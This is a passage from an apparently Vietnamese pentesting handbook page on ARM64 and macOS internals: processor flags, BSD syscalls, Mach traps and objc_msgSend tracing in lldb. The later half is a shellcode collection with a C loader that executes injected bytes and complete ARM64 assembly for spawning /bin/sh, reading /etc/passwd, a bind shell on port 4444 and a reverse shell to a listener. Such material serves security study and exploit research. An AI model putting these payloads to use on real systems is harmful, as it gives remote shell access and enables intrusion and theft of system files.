- Cờ **`Q`**: Được đặt thành 1 bất cứ khi nào xảy ra **bão hòa số nguyên** trong quá trình thực thi một lệnh số học bão hòa chuyên biệt. Sau khi được đặt thành **`1`**, cờ sẽ giữ nguyên giá trị cho đến khi được đặt thủ công về 0. Ngoài ra, không có lệnh nào kiểm tra giá trị này một cách ngầm định; phải đọc giá trị thủ công.
- Các cờ **`GE`** (Greater than or equal): Được dùng trong các thao tác SIMD (Single Instruction, Multiple Data), chẳng hạn như "cộng song song" và "trừ song song". Các thao tác này cho phép xử lý nhiều điểm dữ liệu trong một lệnh.

  Ví dụ, lệnh **`UADD8`** **cộng song song bốn cặp byte** (từ hai toán hạng 32-bit) và lưu kết quả vào một thanh ghi 32-bit. Sau đó, lệnh **đặt các cờ `GE` trong `APSR`** dựa trên các kết quả này. Mỗi cờ GE tương ứng với một phép cộng byte, cho biết phép cộng của cặp byte đó có **bị tràn** hay không.

  Lệnh **`SEL`** sử dụng các cờ GE này để thực hiện các thao tác có điều kiện.

#### Execution State Registers

- Các bit **`J`** và **`T`**: **`J`** phải là 0; nếu **`T`** là 0 thì dùng tập lệnh A32, còn nếu là 1 thì dùng T32.
- IT Block State Register (`ITSTATE`): Đây là các bit từ 10-15 và 25-26. Chúng lưu điều kiện cho các lệnh bên trong một nhóm có tiền tố **`IT`**.
- Bit **`E`**: Cho biết **endianness**.
- **Các bit Mode và Exception Mask** (0-4): Chúng xác định trạng thái thực thi hiện tại. Bit thứ **5** cho biết chương trình chạy ở chế độ 32-bit (giá trị 1) hay 64-bit (giá trị 0). Bốn bit còn lại biểu thị **chế độ ngoại lệ hiện đang được sử dụng** (khi ngoại lệ xảy ra và đang được xử lý). Giá trị được đặt **cho biết mức ưu tiên hiện tại** trong trường hợp một ngoại lệ khác được kích hoạt trong khi ngoại lệ này đang được xử lý.

<figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>

- **`AIF`**: Có thể vô hiệu hóa một số ngoại lệ bằng các bit **`A`**, `I`, `F`. Nếu **`A`** là 1, điều đó có nghĩa là các **lỗi hủy bất đồng bộ** sẽ được kích hoạt. **`I`** cấu hình phản hồi với các **yêu cầu ngắt** (IRQ) từ phần cứng bên ngoài. `F` liên quan đến **các yêu cầu ngắt nhanh** (FIR).

## macOS

### BSD syscalls

Tham khảo [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master) hoặc chạy `cat /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/sys/syscall.h`. BSD syscalls sẽ có **x16 > 0**.

### Mach Traps

Tham khảo `mach_trap_table` trong [**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) và các prototype trong [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h). Số lượng Mach trap tối đa là `MACH_TRAP_TABLE_COUNT` = 128. Mach traps sẽ có **x16 < 0**, vì vậy bạn cần gọi các số trong danh sách trước đó với dấu **trừ**: **`_kernelrpc_mach_vm_allocate_trap`** là **`-10`**.

Bạn cũng có thể kiểm tra **`libsystem_kernel.dylib`** bằng disassembler để tìm cách gọi các syscall này (và BSD):

```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```

Lưu ý rằng **Ida** và **Ghidra** cũng có thể decompile **các dylib cụ thể** từ cache chỉ bằng cách truyền cache vào.

> [!TIP]
> Đôi khi kiểm tra mã đã **decompile** từ **`libsystem_kernel.dylib`** sẽ dễ hơn kiểm tra **source code**, vì mã của một số syscall (BSD và Mach) được tạo bằng script (hãy xem các comment trong source code), còn trong dylib, bạn có thể thấy những gì đang được gọi.

### machdep calls

XNU hỗ trợ một loại call khác gọi là machine dependent. Số hiệu của các call này phụ thuộc vào kiến trúc, và cả các call lẫn số hiệu đều không được đảm bảo sẽ giữ nguyên.

### comm page

Đây là một trang bộ nhớ do kernel sở hữu, được ánh xạ vào không gian địa chỉ của mọi tiến trình người dùng. Mục đích của nó là giúp việc chuyển từ user mode sang kernel space nhanh hơn so với dùng syscall cho các dịch vụ kernel được sử dụng thường xuyên đến mức việc chuyển đổi này sẽ rất kém hiệu quả.

Ví dụ, call `gettimeofdate` đọc trực tiếp giá trị `timeval` từ comm page.

### objc_msgSend

Hàm này thường xuất hiện trong các binary Objective-C và Swift vì nó gửi một message đến một đối tượng Objective-C.

Tham số ([thông tin thêm trong tài liệu](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):<sup>[[4]](#references)</sup>

- x0: self -> Con trỏ đến instance
- x1: op -> Selector của method
- x2... -> Các argument còn lại của method được gọi

Vì vậy, nếu bạn đặt breakpoint trước nhánh gọi đến hàm này, bạn có thể dễ dàng tìm ra lệnh gọi nào được thực hiện trong lldb bằng cách dùng (trong ví dụ này, đối tượng gọi một đối tượng từ `NSConcreteTask`, đối tượng này sẽ chạy một lệnh):

```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```

> [!TIP]
> Thiết lập biến môi trường **`NSObjCMessageLoggingEnabled=1`** cho phép ghi log khi hàm này được gọi vào một file như `/tmp/msgSends-pid`.
>
> Ngoài ra, thiết lập **`OBJC_HELP=1`** rồi gọi bất kỳ binary nào cũng cho phép bạn xem các biến môi trường khác có thể dùng để **ghi log** khi một số hành động Objc-C nhất định xảy ra.

Khi hàm này được gọi, cần tìm method được gọi của instance đã chỉ định. Để thực hiện việc này, ta tiến hành các bước tìm kiếm sau:

- Thử tra cứu cache theo hướng lạc quan:
  - Nếu thành công thì xong
- Lấy runtimeLock (read)
  - Nếu (realize && !cls->realized) thì realize class
  - Nếu (initialize && !cls->initialized) thì initialize class
- Thử cache riêng của class:
  - Nếu thành công thì xong
- Thử danh sách method của class:
  - Nếu tìm thấy thì điền vào cache rồi xong
- Thử cache của superclass:
  - Nếu thành công thì xong
- Thử danh sách method của superclass:
  - Nếu tìm thấy thì điền vào cache rồi xong
- Nếu có (resolver), thử method resolver rồi lặp lại từ bước tra cứu class
- Nếu vẫn đến đây (= mọi cách khác đều thất bại), thử forwarder

### Shellcodes

Để biên dịch:

```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```

Để trích xuất các byte:

```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
    echo -n '\\x'$c
done
```

Đối với macOS mới hơn:

```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
    echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```

<details>

<summary>Mã C để kiểm tra shellcode</summary>

```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
    printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

    void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

    if (ptr == MAP_FAILED) {
        perror("mmap");
        exit(-1);
    }
    printf("[+] SUCCESS: mmap\n");
    printf("    |-> Return = %p\n", ptr);

    void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
    printf("[+] SUCCESS: memcpy\n");
    printf("    |-> Return = %p\n", dst);

    int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

    if (status == -1) {
        perror("mprotect");
        exit(-1);
    }
    printf("[+] SUCCESS: mprotect\n");
    printf("    |-> Return = %d\n", status);

    printf("[>] Trying to execute shellcode...\n");

    sc = ptr;
    sc();

    return 0;
}
```

</details>

#### Shell

Được lấy từ [**đây**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) và có giải thích.<sup>[[1]](#references)</sup>

{{#tabs}}
{{#tab name="with adr"}}

```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
    adr  x0, sh_path  ; This is the address of "/bin/sh".
    mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
    mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
    mov  x16, #59     ; Move the execve syscall number (59) into x16.
    svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```

{{#endtab}}

{{#tab name="with stack"}}

```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
    ; We are going to build the string "/bin/sh" and place it on the stack.

    mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
    movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
    movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
    movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

    str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

    ; Prepare arguments for the execve syscall.

    mov  x1, #8       ; Set x1 to 8.
    sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
    mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
    mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

    ; Make the syscall.

    mov  x16, #59     ; Move the execve syscall number (59) into x16.
    svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```

{{#endtab}}

{{#tab name="with adr for linux"}}

```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
    adr  x0, sh_path  ; This is the address of "/bin/sh".
    mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
    mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
    mov  x16, #59     ; Move the execve syscall number (59) into x16.
    svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```

{{#endtab}}
{{#endtabs}}

#### Đọc bằng cat

Ví dụ này gọi `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`. Thanh ghi `x1` trỏ đến vector đối số kết thúc bằng null, chứa các con trỏ đến hai chuỗi.

```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
    ; Prepare the arguments for the execve syscall
    sub sp, sp, #48        ; Allocate space on the stack
    mov x1, sp             ; x1 will hold the address of the argument array
    adr x0, cat_path
    str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
    adr x0, passwd_path    ; Get the address of "/etc/passwd"
    str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
    str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

    adr x0, cat_path
    mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
    mov x16, #59           ; Load the syscall number for execve (59) into x8
    svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```

#### Gọi lệnh bằng sh từ một fork để tiến trình chính không bị kill

```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
    ; Prepare the arguments for the fork syscall
    mov x16, #2            ; Load the syscall number for fork (2) into x8
    svc 0                  ; Make the syscall
    cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
    beq _loop              ; If not child process, loop

    ; Prepare the arguments for the execve syscall

    sub sp, sp, #64        ; Allocate space on the stack
    mov x1, sp             ; x1 will hold the address of the argument array
    adr x0, sh_path
    str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
    adr x0, sh_c_option    ; Get the address of "-c"
    str x0, [x1, #8]       ; Store the address of "-c" as the second argument
    adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
    str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
    str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

    adr x0, sh_path
    mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
    mov x16, #59           ; Load the syscall number for execve (59) into x8
    svc 0                  ; Make the syscall


_exit:
    mov x16, #1            ; Load the syscall number for exit (1) into x8
    mov x0, #0             ; Set exit status code to 0
    svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```

#### Bind shell

Bind shell từ [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s) trên **port 4444**<sup>[[2]](#references)</sup>

```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
    // s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
    mov  x16, #97
    lsr  x1, x16, #6
    lsl  x0, x1, #1
    mov  x2, xzr
    svc  #0x1337

    // save s
    mvn  x3, x0

call_bind:
    /*
     * bind(s, &sockaddr, 0x10)
     *
     * struct sockaddr_in {
     *     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
     *     sa_family_t     sin_family;  // AF_INET = 2
     *     in_port_t       sin_port;    // 4444 = 0x115C
     *     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
     *     char            sin_zero[8]; // Don't care
     * };
     */
    mov  x1, #0x0210
    movk x1, #0x5C11, lsl #16
    str  x1, [sp, #-8]
    mov  x2, #8
    sub  x1, sp, x2
    mov  x2, #16
    mov  x16, #104
    svc  #0x1337

call_listen:
    // listen(s, 2)
    mvn  x0, x3
    lsr  x1, x2, #3
    mov  x16, #106
    svc  #0x1337

call_accept:
    // c = accept(s, 0, 0)
    mvn  x0, x3
    mov  x1, xzr
    mov  x2, xzr
    mov  x16, #30
    svc  #0x1337

    mvn  x3, x0
    lsr  x2, x16, #4
    lsl  x2, x2, #2

call_dup:
    // dup(c, 2) -> dup(c, 1) -> dup(c, 0)
    mvn  x0, x3
    lsr  x2, x2, #1
    mov  x1, x2
    mov  x16, #90
    svc  #0x1337
    mov  x10, xzr
    cmp  x10, x2
    bne  call_dup

call_execve:
    // execve("/bin/sh", 0, 0)
    mov  x1, #0x622F
    movk x1, #0x6E69, lsl #16
    movk x1, #0x732F, lsl #32
    movk x1, #0x68, lsl #48
    str  x1, [sp, #-8]
    mov	 x1, #8
    sub  x0, sp, x1
    mov  x1, xzr
    mov  x2, xzr
    mov  x16, #59
    svc  #0x1337
```

#### Reverse shell

Từ [https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s), revshell tới **127.0.0.1:4444**<sup>[[3]](#references)</sup>

```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
    // s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
    mov  x16, #97
    lsr  x1, x16, #6
    lsl  x0, x1, #1
    mov  x2, xzr
    svc  #0x1337

    // save s
    mvn  x3, x0

call_connect:
    /*
     * connect(s, &sockaddr, 0x10)
     *
     * struct sockaddr_in {
     *     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
     *     sa_family_t     sin_family;  // AF_INET = 2
     *     in_port_t       sin_port;    // 4444 = 0x115C
     *     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
     *     char            sin_zero[8]; // Don't care
     * };
     */
    mov  x1, #0x0210
    movk x1, #0x5C11, lsl #16
    movk x1, #0x007F, lsl #32
    movk x1, #0x0100, lsl #48
    str  x1, [sp, #-8]
    mov  x2, #8
    sub  x1, sp, x2
    mov  x2, #16
    mov  x16, #98
    svc  #0x1337

    lsr  x2, x2, #2

call_dup:
    // dup(s, 2) -> dup(s, 1) -> dup(s, 0)
    mvn  x0, x3
    lsr  x2, x2, #1
    mov  x1, x2
    mov  x16, #90
    svc  #0x1337
    mov  x10, xzr
    cmp  x10, x2
    bne  call_dup

call_execve:
    // execve("/bin/sh", 0, 0)
    mov  x1, #0x622F
    movk x1, #0x6E69, lsl #16
    movk x1, #0x732F, lsl #32
    movk x1, #0x68, lsl #48
    str  x1, [sp, #-8]
    mov	 x1, #8
    sub  x0, sp, x1
    mov  x1, xzr
    mov  x2, xzr
    mov  x16, #59
    svc  #0x1337
```

## References

- [1] [daem0nc0re/macOS_ARM64_Shellcode - shell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s)
- [2] [daem0nc0re/macOS_ARM64_Shellcode - bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s)
- [3] [daem0nc0re/macOS_ARM64_Shellcode - reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s)
- [4] [Apple Developer - 712 Objc Msgsend](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)
- [5] [Arm - Sổ tay tham chiếu kiến trúc Arm dành cho kiến trúc A-profile](https://developer.arm.com/documentation/ddi0487/latest)
- [6] [Apple Platform Security - Tính toàn vẹn của hệ điều hành](https://support.apple.com/guide/security/sec8b776536b/web)
{{#include ../../../banners/hacktricks-training.md}}
